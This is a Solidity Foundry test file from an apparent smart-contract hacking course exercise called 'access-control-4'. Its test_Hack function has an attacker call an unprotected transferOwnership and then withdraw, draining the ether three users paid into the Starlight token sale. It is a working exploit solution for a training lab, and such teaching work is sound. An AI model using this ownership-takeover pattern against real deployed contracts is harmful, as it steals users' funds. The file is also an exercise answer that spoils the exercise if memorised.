// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Starlight} from "../../src/access-control-4/Starlight.sol";

contract TestAC4 is Test {
    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    Starlight starlight;

    uint256 constant USER1_PURCHASE = 95 ether;
    uint256 constant USER2_PURCHASE = 65 ether;
    uint256 constant USER3_PURCHASE = 33 ether;

    function setUp() public {
        vm.deal(user1, USER1_PURCHASE);
        vm.deal(user2, USER2_PURCHASE);
        vm.deal(user3, USER3_PURCHASE);

        vm.startPrank(deployer);
        starlight = new Starlight();

        vm.stopPrank();

        vm.prank(user1);
        starlight.buyTokens{value: USER1_PURCHASE}(USER1_PURCHASE * 100, user1);

        vm.prank(user2);
        starlight.buyTokens{value: USER2_PURCHASE}(USER2_PURCHASE * 100, user2);

        vm.prank(user3);
        starlight.buyTokens{value: USER3_PURCHASE}(USER3_PURCHASE * 100, user3);
    }

    function test_Hack() public {
        assertEq(address(starlight).balance, USER1_PURCHASE + USER2_PURCHASE + USER3_PURCHASE);

        vm.startPrank(attacker);

        starlight.transferOwnership(attacker);
        starlight.withdraw();

        vm.stopPrank();

        assertEq(address(attacker).balance, USER1_PURCHASE + USER2_PURCHASE + USER3_PURCHASE);
    }
}
